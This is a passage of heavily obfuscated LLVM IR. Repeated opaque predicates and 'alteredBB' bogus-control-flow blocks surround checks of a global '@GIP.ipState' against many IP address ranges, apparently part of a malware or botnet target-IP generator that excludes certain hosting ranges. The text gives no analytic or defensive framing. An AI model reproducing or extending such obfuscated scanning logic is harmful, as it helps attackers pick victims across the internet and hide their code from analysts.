  %1760 = zext i8 %1759 to i32
  %1761 = icmp sge i32 %1760, 21
  %1762 = load i32, i32* @x.69
  %1763 = load i32, i32* @y.70
  %1764 = sub i32 %1762, 1
  %1765 = mul i32 %1762, %1764
  %1766 = urem i32 %1765, 2
  %1767 = icmp eq i32 %1766, 0
  %1768 = icmp slt i32 %1763, 10
  %1769 = or i1 %1767, %1768
  br i1 %1769, label %originalBBpart2270, label %originalBB268alteredBB

originalBBpart2270:                               ; preds = %originalBB268
  br i1 %1761, label %1770, label %1774

; <label>:1770:                                   ; preds = %originalBBpart2270
  %1771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1772 = zext i8 %1771 to i32
  %1773 = icmp slt i32 %1772, 32
  br i1 %1773, label %4994, label %1774

; <label>:1774:                                   ; preds = %1770, %originalBBpart2270, %originalBBpart2266
  %1775 = load i32, i32* @x.69
  %1776 = load i32, i32* @y.70
  %1777 = sub i32 %1775, 1
  %1778 = mul i32 %1775, %1777
  %1779 = urem i32 %1778, 2
  %1780 = icmp eq i32 %1779, 0
  %1781 = icmp slt i32 %1776, 10
  %1782 = or i1 %1780, %1781
  br i1 %1782, label %originalBB272, label %originalBB272alteredBB

originalBB272:                                    ; preds = %originalBB272alteredBB, %1774
  %1783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1784 = zext i8 %1783 to i32
  %1785 = icmp eq i32 %1784, 155
  %1786 = load i32, i32* @x.69
  %1787 = load i32, i32* @y.70
  %1788 = sub i32 %1786, 1
  %1789 = mul i32 %1786, %1788
  %1790 = urem i32 %1789, 2
  %1791 = icmp eq i32 %1790, 0
  %1792 = icmp slt i32 %1787, 10
  %1793 = or i1 %1791, %1792
  br i1 %1793, label %originalBBpart2274, label %originalBB272alteredBB

originalBBpart2274:                               ; preds = %originalBB272
  br i1 %1785, label %1794, label %1802

; <label>:1794:                                   ; preds = %originalBBpart2274
  %1795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = icmp sge i32 %1796, 5
  br i1 %1797, label %1798, label %1802

; <label>:1798:                                   ; preds = %1794
  %1799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1800 = zext i8 %1799 to i32
  %1801 = icmp slt i32 %1800, 10
  br i1 %1801, label %4994, label %1802

; <label>:1802:                                   ; preds = %1798, %1794, %originalBBpart2274
  %1803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1804 = zext i8 %1803 to i32
  %1805 = icmp eq i32 %1804, 155
  br i1 %1805, label %1806, label %1830

; <label>:1806:                                   ; preds = %1802
  %1807 = load i32, i32* @x.69
  %1808 = load i32, i32* @y.70
  %1809 = sub i32 %1807, 1
  %1810 = mul i32 %1807, %1809
  %1811 = urem i32 %1810, 2
  %1812 = icmp eq i32 %1811, 0
  %1813 = icmp slt i32 %1808, 10
  %1814 = or i1 %1812, %1813
  br i1 %1814, label %originalBB276, label %originalBB276alteredBB

originalBB276:                                    ; preds = %originalBB276alteredBB, %1806
  %1815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1816 = zext i8 %1815 to i32
  %1817 = icmp sge i32 %1816, 74
  %1818 = load i32, i32* @x.69
  %1819 = load i32, i32* @y.70
  %1820 = sub i32 %1818, 1
  %1821 = mul i32 %1818, %1820
  %1822 = urem i32 %1821, 2
  %1823 = icmp eq i32 %1822, 0
  %1824 = icmp slt i32 %1819, 10
  %1825 = or i1 %1823, %1824
  br i1 %1825, label %originalBBpart2278, label %originalBB276alteredBB

originalBBpart2278:                               ; preds = %originalBB276
  br i1 %1817, label %1826, label %1830

; <label>:1826:                                   ; preds = %originalBBpart2278
  %1827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1828 = zext i8 %1827 to i32
  %1829 = icmp slt i32 %1828, 89
  br i1 %1829, label %4994, label %1830

; <label>:1830:                                   ; preds = %1826, %originalBBpart2278, %1802
  %1831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1832 = zext i8 %1831 to i32
  %1833 = icmp eq i32 %1832, 155
  br i1 %1833, label %1834, label %1874

; <label>:1834:                                   ; preds = %1830
  %1835 = load i32, i32* @x.69
  %1836 = load i32, i32* @y.70
  %1837 = sub i32 %1835, 1
  %1838 = mul i32 %1835, %1837
  %1839 = urem i32 %1838, 2
  %1840 = icmp eq i32 %1839, 0
  %1841 = icmp slt i32 %1836, 10
  %1842 = or i1 %1840, %1841
  br i1 %1842, label %originalBB280, label %originalBB280alteredBB

originalBB280:                                    ; preds = %originalBB280alteredBB, %1834
  %1843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1844 = zext i8 %1843 to i32
  %1845 = icmp sge i32 %1844, 213
  %1846 = load i32, i32* @x.69
  %1847 = load i32, i32* @y.70
  %1848 = sub i32 %1846, 1
  %1849 = mul i32 %1846, %1848
  %1850 = urem i32 %1849, 2
  %1851 = icmp eq i32 %1850, 0
  %1852 = icmp slt i32 %1847, 10
  %1853 = or i1 %1851, %1852
  br i1 %1853, label %originalBBpart2282, label %originalBB280alteredBB

originalBBpart2282:                               ; preds = %originalBB280
  br i1 %1845, label %1854, label %1874

; <label>:1854:                                   ; preds = %originalBBpart2282
  %1855 = load i32, i32* @x.69
  %1856 = load i32, i32* @y.70
  %1857 = sub i32 %1855, 1
  %1858 = mul i32 %1855, %1857
  %1859 = urem i32 %1858, 2
  %1860 = icmp eq i32 %1859, 0
  %1861 = icmp slt i32 %1856, 10
  %1862 = or i1 %1860, %1861
  br i1 %1862, label %originalBB284, label %originalBB284alteredBB

originalBB284:                                    ; preds = %originalBB284alteredBB, %1854
  %1863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1864 = zext i8 %1863 to i32
  %1865 = icmp slt i32 %1864, 222
  %1866 = load i32, i32* @x.69
  %1867 = load i32, i32* @y.70
  %1868 = sub i32 %1866, 1
  %1869 = mul i32 %1866, %1868
  %1870 = urem i32 %1869, 2
  %1871 = icmp eq i32 %1870, 0
  %1872 = icmp slt i32 %1867, 10
  %1873 = or i1 %1871, %1872
  br i1 %1873, label %originalBBpart2286, label %originalBB284alteredBB

originalBBpart2286:                               ; preds = %originalBB284
  br i1 %1865, label %4994, label %1874

; <label>:1874:                                   ; preds = %originalBBpart2286, %originalBBpart2282, %1830
  %1875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1876 = zext i8 %1875 to i32
  %1877 = icmp eq i32 %1876, 157
  br i1 %1877, label %1878, label %1886

; <label>:1878:                                   ; preds = %1874
  %1879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1880 = zext i8 %1879 to i32
  %1881 = icmp sge i32 %1880, 150
  br i1 %1881, label %1882, label %1886

; <label>:1882:                                   ; preds = %1878
  %1883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1884 = zext i8 %1883 to i32
  %1885 = icmp slt i32 %1884, 154
  br i1 %1885, label %4994, label %1886

; <label>:1886:                                   ; preds = %1882, %1878, %1874
  %1887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1888 = zext i8 %1887 to i32
  %1889 = icmp eq i32 %1888, 158
  br i1 %1889, label %1890, label %1898

; <label>:1890:                                   ; preds = %1886
  %1891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1892 = zext i8 %1891 to i32
  %1893 = icmp sge i32 %1892, 1
  br i1 %1893, label %1894, label %1898

; <label>:1894:                                   ; preds = %1890
  %1895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1896 = zext i8 %1895 to i32
  %1897 = icmp slt i32 %1896, 21
  br i1 %1897, label %4994, label %1898

; <label>:1898:                                   ; preds = %1894, %1890, %1886
  %1899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1900 = zext i8 %1899 to i32
  %1901 = icmp eq i32 %1900, 158
  br i1 %1901, label %1902, label %1926

; <label>:1902:                                   ; preds = %1898
  %1903 = load i32, i32* @x.69
  %1904 = load i32, i32* @y.70
  %1905 = sub i32 %1903, 1
  %1906 = mul i32 %1903, %1905
  %1907 = urem i32 %1906, 2
  %1908 = icmp eq i32 %1907, 0
  %1909 = icmp slt i32 %1904, 10
  %1910 = or i1 %1908, %1909
  br i1 %1910, label %originalBB288, label %originalBB288alteredBB

originalBB288:                                    ; preds = %originalBB288alteredBB, %1902
  %1911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1912 = zext i8 %1911 to i32
  %1913 = icmp sge i32 %1912, 235
  %1914 = load i32, i32* @x.69
  %1915 = load i32, i32* @y.70
  %1916 = sub i32 %1914, 1
  %1917 = mul i32 %1914, %1916
  %1918 = urem i32 %1917, 2
  %1919 = icmp eq i32 %1918, 0
  %1920 = icmp slt i32 %1915, 10
  %1921 = or i1 %1919, %1920
  br i1 %1921, label %originalBBpart2290, label %originalBB288alteredBB

originalBBpart2290:                               ; preds = %originalBB288
  br i1 %1913, label %1922, label %1926

; <label>:1922:                                   ; preds = %originalBBpart2290
  %1923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1924 = zext i8 %1923 to i32
  %1925 = icmp slt i32 %1924, 247
  br i1 %1925, label %4994, label %1926

; <label>:1926:                                   ; preds = %1922, %originalBBpart2290, %1898
  %1927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1928 = zext i8 %1927 to i32
  %1929 = icmp eq i32 %1928, 159
  br i1 %1929, label %1930, label %1938

; <label>:1930:                                   ; preds = %1926
  %1931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1932 = zext i8 %1931 to i32
  %1933 = icmp sge i32 %1932, 120
  br i1 %1933, label %1934, label %1938

; <label>:1934:                                   ; preds = %1930
  %1935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1936 = zext i8 %1935 to i32
  %1937 = icmp slt i32 %1936, 121
  br i1 %1937, label %4994, label %1938

; <label>:1938:                                   ; preds = %1934, %1930, %1926
  %1939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1940 = zext i8 %1939 to i32
  %1941 = icmp eq i32 %1940, 160
  br i1 %1941, label %1942, label %1950

; <label>:1942:                                   ; preds = %1938
  %1943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1944 = zext i8 %1943 to i32
  %1945 = icmp sge i32 %1944, 132
  br i1 %1945, label %1946, label %1950

; <label>:1946:                                   ; preds = %1942
  %1947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1948 = zext i8 %1947 to i32
  %1949 = icmp slt i32 %1948, 151
  br i1 %1949, label %4994, label %1950

; <label>:1950:                                   ; preds = %1946, %1942, %1938
  %1951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1952 = zext i8 %1951 to i32
  %1953 = icmp eq i32 %1952, 64
  br i1 %1953, label %1954, label %1962

; <label>:1954:                                   ; preds = %1950
  %1955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1956 = zext i8 %1955 to i32
  %1957 = icmp sge i32 %1956, 224
  br i1 %1957, label %1958, label %1962

; <label>:1958:                                   ; preds = %1954
  %1959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1960 = zext i8 %1959 to i32
  %1961 = icmp slt i32 %1960, 227
  br i1 %1961, label %4994, label %1962

; <label>:1962:                                   ; preds = %1958, %1954, %1950
  %1963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1964 = zext i8 %1963 to i32
  %1965 = icmp eq i32 %1964, 162
  br i1 %1965, label %1966, label %1974

; <label>:1966:                                   ; preds = %1962
  %1967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1968 = zext i8 %1967 to i32
  %1969 = icmp sge i32 %1968, 45
  br i1 %1969, label %1970, label %1974

; <label>:1970:                                   ; preds = %1966
  %1971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1972 = zext i8 %1971 to i32
  %1973 = icmp slt i32 %1972, 47
  br i1 %1973, label %4994, label %1974

; <label>:1974:                                   ; preds = %1970, %1966, %1962
  %1975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1976 = zext i8 %1975 to i32
  %1977 = icmp eq i32 %1976, 163
  br i1 %1977, label %1978, label %1986

; <label>:1978:                                   ; preds = %1974
  %1979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1980 = zext i8 %1979 to i32
  %1981 = icmp sge i32 %1980, 205
  br i1 %1981, label %1982, label %1986

; <label>:1982:                                   ; preds = %1978
  %1983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1984 = zext i8 %1983 to i32
  %1985 = icmp slt i32 %1984, 207
  br i1 %1985, label %4994, label %1986

; <label>:1986:                                   ; preds = %1982, %1978, %1974
  %1987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1988 = zext i8 %1987 to i32
  %1989 = icmp eq i32 %1988, 164
  br i1 %1989, label %1990, label %1998

; <label>:1990:                                   ; preds = %1986
  %1991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1992 = zext i8 %1991 to i32
  %1993 = icmp sge i32 %1992, 45
  br i1 %1993, label %1994, label %1998

; <label>:1994:                                   ; preds = %1990
  %1995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1996 = zext i8 %1995 to i32
  %1997 = icmp slt i32 %1996, 50
  br i1 %1997, label %4994, label %1998

; <label>:1998:                                   ; preds = %1994, %1990, %1986
  %1999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2000 = zext i8 %1999 to i32
  %2001 = icmp eq i32 %2000, 164
  br i1 %2001, label %2002, label %2010

; <label>:2002:                                   ; preds = %1998
  %2003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2004 = zext i8 %2003 to i32
  %2005 = icmp sge i32 %2004, 217
  br i1 %2005, label %2006, label %2010

; <label>:2006:                                   ; preds = %2002
  %2007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2008 = zext i8 %2007 to i32
  %2009 = icmp slt i32 %2008, 233
  br i1 %2009, label %4994, label %2010

; <label>:2010:                                   ; preds = %2006, %2002, %1998
  %2011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2012 = zext i8 %2011 to i32
  %2013 = icmp eq i32 %2012, 169
  br i1 %2013, label %2014, label %2022

; <label>:2014:                                   ; preds = %2010
  %2015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2016 = zext i8 %2015 to i32
  %2017 = icmp sge i32 %2016, 252
  br i1 %2017, label %2018, label %2022

; <label>:2018:                                   ; preds = %2014
  %2019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2020 = zext i8 %2019 to i32
  %2021 = icmp slt i32 %2020, 254
  br i1 %2021, label %4994, label %2022

; <label>:2022:                                   ; preds = %2018, %2014, %2010
  %2023 = load i32, i32* @x.69
  %2024 = load i32, i32* @y.70
  %2025 = sub i32 %2023, 1
  %2026 = mul i32 %2023, %2025
  %2027 = urem i32 %2026, 2
  %2028 = icmp eq i32 %2027, 0
  %2029 = icmp slt i32 %2024, 10
  %2030 = or i1 %2028, %2029
  br i1 %2030, label %originalBB292, label %originalBB292alteredBB

originalBB292:                                    ; preds = %originalBB292alteredBB, %2022
  %2031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2032 = zext i8 %2031 to i32
  %2033 = icmp eq i32 %2032, 199
  %2034 = load i32, i32* @x.69
  %2035 = load i32, i32* @y.70
  %2036 = sub i32 %2034, 1
  %2037 = mul i32 %2034, %2036
  %2038 = urem i32 %2037, 2
  %2039 = icmp eq i32 %2038, 0
  %2040 = icmp slt i32 %2035, 10
  %2041 = or i1 %2039, %2040
  br i1 %2041, label %originalBBpart2294, label %originalBB292alteredBB

originalBBpart2294:                               ; preds = %originalBB292
  br i1 %2033, label %2042, label %2050

; <label>:2042:                                   ; preds = %originalBBpart2294
  %2043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2044 = zext i8 %2043 to i32
  %2045 = icmp sge i32 %2044, 121
  br i1 %2045, label %2046, label %2050

; <label>:2046:                                   ; preds = %2042
  %2047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2048 = zext i8 %2047 to i32
  %2049 = icmp slt i32 %2048, 254
  br i1 %2049, label %4994, label %2050

; <label>:2050:                                   ; preds = %2046, %2042, %originalBBpart2294
  %2051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2052 = zext i8 %2051 to i32
  %2053 = icmp eq i32 %2052, 205
  br i1 %2053, label %2054, label %2062

; <label>:2054:                                   ; preds = %2050
  %2055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = icmp sge i32 %2056, 1
  br i1 %2057, label %2058, label %2062

; <label>:2058:                                   ; preds = %2054
  %2059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2060 = zext i8 %2059 to i32
  %2061 = icmp slt i32 %2060, 118
  br i1 %2061, label %4994, label %2062

; <label>:2062:                                   ; preds = %2058, %2054, %2050
  %2063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2064 = zext i8 %2063 to i32
  %2065 = icmp eq i32 %2064, 207
  br i1 %2065, label %2066, label %2090

; <label>:2066:                                   ; preds = %2062
  %2067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2068 = zext i8 %2067 to i32
  %2069 = icmp sge i32 %2068, 60
  br i1 %2069, label %2070, label %2090

; <label>:2070:                                   ; preds = %2066
  %2071 = load i32, i32* @x.69
  %2072 = load i32, i32* @y.70
  %2073 = sub i32 %2071, 1
  %2074 = mul i32 %2071, %2073
  %2075 = urem i32 %2074, 2
  %2076 = icmp eq i32 %2075, 0
  %2077 = icmp slt i32 %2072, 10
  %2078 = or i1 %2076, %2077
  br i1 %2078, label %originalBB296, label %originalBB296alteredBB

originalBB296:                                    ; preds = %originalBB296alteredBB, %2070
  %2079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2080 = zext i8 %2079 to i32
  %2081 = icmp slt i32 %2080, 62
  %2082 = load i32, i32* @x.69
  %2083 = load i32, i32* @y.70
  %2084 = sub i32 %2082, 1
  %2085 = mul i32 %2082, %2084
  %2086 = urem i32 %2085, 2
  %2087 = icmp eq i32 %2086, 0
  %2088 = icmp slt i32 %2083, 10
  %2089 = or i1 %2087, %2088
  br i1 %2089, label %originalBBpart2298, label %originalBB296alteredBB

originalBBpart2298:                               ; preds = %originalBB296
  br i1 %2081, label %4994, label %2090

; <label>:2090:                                   ; preds = %originalBBpart2298, %2066, %2062
  %2091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2092 = zext i8 %2091 to i32
  %2093 = icmp eq i32 %2092, 104
  br i1 %2093, label %2094, label %2102

; <label>:2094:                                   ; preds = %2090
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp sge i32 %2096, 16
  br i1 %2097, label %2098, label %2102

; <label>:2098:                                   ; preds = %2094
  %2099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2100 = zext i8 %2099 to i32
  %2101 = icmp slt i32 %2100, 31
  br i1 %2101, label %4994, label %2102

; <label>:2102:                                   ; preds = %2098, %2094, %2090
  %2103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2104 = zext i8 %2103 to i32
  %2105 = icmp eq i32 %2104, 188
  br i1 %2105, label %2106, label %2110

; <label>:2106:                                   ; preds = %2102
  %2107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2108 = zext i8 %2107 to i32
  %2109 = icmp eq i32 %2108, 166
  br i1 %2109, label %4994, label %2110

; <label>:2110:                                   ; preds = %2106, %2102
  %2111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2112 = zext i8 %2111 to i32
  %2113 = icmp eq i32 %2112, 188
  br i1 %2113, label %2114, label %2134

; <label>:2114:                                   ; preds = %2110
  %2115 = load i32, i32* @x.69
  %2116 = load i32, i32* @y.70
  %2117 = sub i32 %2115, 1
  %2118 = mul i32 %2115, %2117
  %2119 = urem i32 %2118, 2
  %2120 = icmp eq i32 %2119, 0
  %2121 = icmp slt i32 %2116, 10
  %2122 = or i1 %2120, %2121
  br i1 %2122, label %originalBB300, label %originalBB300alteredBB

originalBB300:                                    ; preds = %originalBB300alteredBB, %2114
  %2123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2124 = zext i8 %2123 to i32
  %2125 = icmp eq i32 %2124, 226
  %2126 = load i32, i32* @x.69
  %2127 = load i32, i32* @y.70
  %2128 = sub i32 %2126, 1
  %2129 = mul i32 %2126, %2128
  %2130 = urem i32 %2129, 2
  %2131 = icmp eq i32 %2130, 0
  %2132 = icmp slt i32 %2127, 10
  %2133 = or i1 %2131, %2132
  br i1 %2133, label %originalBBpart2302, label %originalBB300alteredBB

originalBBpart2302:                               ; preds = %originalBB300
  br i1 %2125, label %4994, label %2134

; <label>:2134:                                   ; preds = %originalBBpart2302, %2110
  %2135 = load i32, i32* @x.69
  %2136 = load i32, i32* @y.70
  %2137 = sub i32 %2135, 1
  %2138 = mul i32 %2135, %2137
  %2139 = urem i32 %2138, 2
  %2140 = icmp eq i32 %2139, 0
  %2141 = icmp slt i32 %2136, 10
  %2142 = or i1 %2140, %2141
  br i1 %2142, label %originalBB304, label %originalBB304alteredBB

originalBB304:                                    ; preds = %originalBB304alteredBB, %2134
  %2143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2144 = zext i8 %2143 to i32
  %2145 = icmp eq i32 %2144, 159
  %2146 = load i32, i32* @x.69
  %2147 = load i32, i32* @y.70
  %2148 = sub i32 %2146, 1
  %2149 = mul i32 %2146, %2148
  %2150 = urem i32 %2149, 2
  %2151 = icmp eq i32 %2150, 0
  %2152 = icmp slt i32 %2147, 10
  %2153 = or i1 %2151, %2152
  br i1 %2153, label %originalBBpart2306, label %originalBB304alteredBB

originalBBpart2306:                               ; preds = %originalBB304
  br i1 %2145, label %2154, label %2158

; <label>:2154:                                   ; preds = %originalBBpart2306
  %2155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2156 = zext i8 %2155 to i32
  %2157 = icmp eq i32 %2156, 203
  br i1 %2157, label %4994, label %2158

; <label>:2158:                                   ; preds = %2154, %originalBBpart2306
  %2159 = load i32, i32* @x.69
  %2160 = load i32, i32* @y.70
  %2161 = sub i32 %2159, 1
  %2162 = mul i32 %2159, %2161
  %2163 = urem i32 %2162, 2
  %2164 = icmp eq i32 %2163, 0
  %2165 = icmp slt i32 %2160, 10
  %2166 = or i1 %2164, %2165
  br i1 %2166, label %originalBB308, label %originalBB308alteredBB

originalBB308:                                    ; preds = %originalBB308alteredBB, %2158
  %2167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2168 = zext i8 %2167 to i32
  %2169 = icmp eq i32 %2168, 162
  %2170 = load i32, i32* @x.69
  %2171 = load i32, i32* @y.70
  %2172 = sub i32 %2170, 1
  %2173 = mul i32 %2170, %2172
  %2174 = urem i32 %2173, 2
  %2175 = icmp eq i32 %2174, 0
  %2176 = icmp slt i32 %2171, 10
  %2177 = or i1 %2175, %2176
  br i1 %2177, label %originalBBpart2310, label %originalBB308alteredBB

originalBBpart2310:                               ; preds = %originalBB308
  br i1 %2169, label %2178, label %2182

; <label>:2178:                                   ; preds = %originalBBpart2310
  %2179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2180 = zext i8 %2179 to i32
  %2181 = icmp eq i32 %2180, 243
  br i1 %2181, label %4994, label %2182

; <label>:2182:                                   ; preds = %2178, %originalBBpart2310
  %2183 = load i32, i32* @x.69
  %2184 = load i32, i32* @y.70
  %2185 = sub i32 %2183, 1
  %2186 = mul i32 %2183, %2185
  %2187 = urem i32 %2186, 2
  %2188 = icmp eq i32 %2187, 0
  %2189 = icmp slt i32 %2184, 10
  %2190 = or i1 %2188, %2189
  br i1 %2190, label %originalBB312, label %originalBB312alteredBB

originalBB312:                                    ; preds = %originalBB312alteredBB, %2182
  %2191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2192 = zext i8 %2191 to i32
  %2193 = icmp eq i32 %2192, 45
  %2194 = load i32, i32* @x.69
  %2195 = load i32, i32* @y.70
  %2196 = sub i32 %2194, 1
  %2197 = mul i32 %2194, %2196
  %2198 = urem i32 %2197, 2
  %2199 = icmp eq i32 %2198, 0
  %2200 = icmp slt i32 %2195, 10
  %2201 = or i1 %2199, %2200
  br i1 %2201, label %originalBBpart2314, label %originalBB312alteredBB

originalBBpart2314:                               ; preds = %originalBB312
  br i1 %2193, label %2202, label %2206

; <label>:2202:                                   ; preds = %originalBBpart2314
  %2203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2204 = zext i8 %2203 to i32
  %2205 = icmp eq i32 %2204, 55
  br i1 %2205, label %4994, label %2206

; <label>:2206:                                   ; preds = %2202, %originalBBpart2314
  %2207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2208 = zext i8 %2207 to i32
  %2209 = icmp eq i32 %2208, 178
  br i1 %2209, label %2210, label %2214

; <label>:2210:                                   ; preds = %2206
  %2211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2212 = zext i8 %2211 to i32
  %2213 = icmp eq i32 %2212, 62
  br i1 %2213, label %4994, label %2214

; <label>:2214:                                   ; preds = %2210, %2206
  %2215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2216 = zext i8 %2215 to i32
  %2217 = icmp eq i32 %2216, 104
  br i1 %2217, label %2218, label %2222

; <label>:2218:                                   ; preds = %2214
  %2219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2220 = zext i8 %2219 to i32
  %2221 = icmp eq i32 %2220, 131
  br i1 %2221, label %4994, label %2222

; <label>:2222:                                   ; preds = %2218, %2214
  %2223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2224 = zext i8 %2223 to i32
  %2225 = icmp eq i32 %2224, 104
  br i1 %2225, label %2226, label %2230

; <label>:2226:                                   ; preds = %2222
